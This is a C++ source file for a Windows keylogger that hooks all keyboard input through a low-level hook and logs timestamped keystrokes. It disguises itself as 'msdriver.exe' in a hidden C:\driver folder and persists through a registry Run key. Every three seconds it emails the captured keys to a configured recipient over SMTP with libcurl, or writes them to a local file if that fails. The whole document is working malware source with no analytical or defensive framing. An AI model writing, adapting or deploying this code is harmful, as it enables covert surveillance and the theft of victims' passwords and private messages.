#define WIN32_LEAN_AND_MEAN

#include <string>
#include <fstream>

#include <winternl.h>
#include <windows.h>
#include <WinBase.h>
#include <tchar.h>

#include <curl/curl.h>

typedef std::basic_string<TCHAR, std::char_traits<TCHAR>, std::allocator<TCHAR> > tstring;
using std::string;
enum workMode {
	sendLogEmail,
	writeLogFile
};

//Settings
tstring executableFileName(_T("msdriver.exe"));
tstring logFileName(_T("bin"));
tstring dirPath(_T("c:\\driver"));
bool	copyToAutorun = true;
int		timerPeriodSeconds = 3;

//Mail settings
string login = "sender@example.com";
string password = "password";
string URL = "smtp://smtp.example.com:587";
string repicient = "repicient@example.com";
bool trySendEmail = true;

//Global variables
string keyLog;
HANDLE logFileHandle;
MSG msg;
string header = "To: " + repicient + "\r\n" +
"From: " + login + " (DuckCpp log sender)\r\n" +
"Subject: Log\r\n\r\n";
workMode mode = trySendEmail ? sendLogEmail : writeLogFile;


//Function prototypes
LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam);
VOID CALLBACK TimerCallback(HWND, UINT, UINT idTimer, DWORD dwTime);
static size_t readfunc(void* ptr, size_t size, size_t nmemb, void* userp);
void processLog();
bool sendMail();

//Main
int APIENTRY _tWinMain(HINSTANCE This, HINSTANCE Prev, LPTSTR cmd, int mode)
{
	//WM_KEYBOARD_LL hook
	SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, NULL);

	//Create directory for log
	CreateDirectory(dirPath.c_str(), NULL);
	SetFileAttributes(dirPath.c_str(), FILE_ATTRIBUTE_HIDDEN);

	//Copy to autorun
	if (copyToAutorun) {
		TCHAR szFileName[MAX_PATH];
		GetModuleFileName(NULL, szFileName, MAX_PATH); //Get current instance's executable file path
		tstring fileCopyPath = dirPath + _T("\\") + executableFileName;	//Get final path
		CopyFile(szFileName, fileCopyPath.c_str(), TRUE); //Copy executable file
		//Set registry autorun key
		HKEY hKey = NULL;
		LONG result = RegOpenKey(HKEY_CURRENT_USER, _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &hKey);
		RegSetValueEx(hKey, _T("Autorun"), 0, REG_SZ, (PBYTE)fileCopyPath.c_str(), fileCopyPath.size() * sizeof(TCHAR) + 1);
		RegCloseKey(hKey);
	}

	//Create timer
	SetTimer(NULL, 1, timerPeriodSeconds * 1000, TimerCallback);

	//Create or open log file
	tstring logPath = dirPath + _T("\\") + logFileName;
	logFileHandle = CreateFile(logPath.c_str(),
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_WRITE | FILE_SHARE_READ,
		NULL,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		0);
	SetFilePointer(logFileHandle, 0, NULL, FILE_END); //Write to end of file

	//Main cycle
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	KillTimer(NULL, 1); //Destroy timer
	processLog();
	CloseHandle(logFileHandle); //Close file handle
	return 0;
}

//Keyboard event
LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
{
	if (code == HC_ACTION && wParam == WM_KEYDOWN)
	{
		//Time
		char timeBuf[10];
		SYSTEMTIME st;
		GetLocalTime(&st);
		sprintf_s(timeBuf, "%.2u:%.2u:%.2u ", st.wHour, st.wMinute, st.wSecond);
		string line(timeBuf);

		//Virtual key code
		DWORD vkCode = (((LPKBDLLHOOKSTRUCT)lParam)->vkCode);

		//Modifiers
		if (vkCode != VK_SHIFT && GetAsyncKeyState(VK_SHIFT)) line += "SHIFT + ";
		if (vkCode != VK_CONTROL && GetAsyncKeyState(VK_CONTROL)) line += "CTRL + ";
		if (vkCode != VK_MENU && GetAsyncKeyState(VK_MENU)) line += "ALT + ";

		char keyName[20];
		GetKeyNameTextA(MapVirtualKeyA(vkCode, NULL) << 16, keyName, 20);
		line.append(keyName);

		keyLog += line + "\n";
		line.clear();
	}
	return 0;
}

//Timer elapsed
VOID CALLBACK TimerCallback(HWND, UINT, UINT idTimer, DWORD dwTime)
{
	processLog();
}

void processLog()
{
	if (mode == sendLogEmail)
	{
		if (!sendMail())
			mode = writeLogFile; //Fail sending mail; will write to file
	}
	if (mode == writeLogFile)
	{
		DWORD numberOfBytesWritten;
		WriteFile(logFileHandle, keyLog.c_str(), keyLog.length(), &numberOfBytesWritten, NULL);
	}
	keyLog.clear();
}

static size_t readfunc(void* ptr, size_t size, size_t nmemb, void* userp)
{
	static int callNumber = 0; //Call number counter, 0 - header, 1 - body, 2 - send mail

	struct upload_status {
		int lines_read;
	} *upload_ctx = (upload_status*)userp;

	if ((size == 0) || (nmemb == 0) || ((size * nmemb) < 1))
		return 0;

	string& data = (callNumber == 0 ? header : keyLog);

	if (++callNumber == 3) {
		callNumber = 0;
		return 0;
	}

	memcpy(ptr, data.c_str(), data.length());
	upload_ctx->lines_read++;
	return data.length();
}

bool sendMail()
{
	CURL* curl = curl_easy_init();
	CURLcode res = CURLE_OK;

	if (curl) {
		curl_easy_setopt(curl, CURLOPT_USERNAME, login.c_str());
		curl_easy_setopt(curl, CURLOPT_PASSWORD, password.c_str());
		curl_easy_setopt(curl, CURLOPT_URL, URL.c_str());
		curl_easy_setopt(curl, CURLOPT_MAIL_FROM, login.c_str());

		struct curl_slist* recipients = NULL;
		recipients = curl_slist_append(recipients, repicient.c_str());
		curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);

		curl_easy_setopt(curl, CURLOPT_READFUNCTION, readfunc);
		curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);

		res = curl_easy_perform(curl);

		curl_slist_free_all(recipients);

		if (res != CURLE_OK)
			return false;

		curl_easy_cleanup(curl);

		return true;
	}
	else return false;
}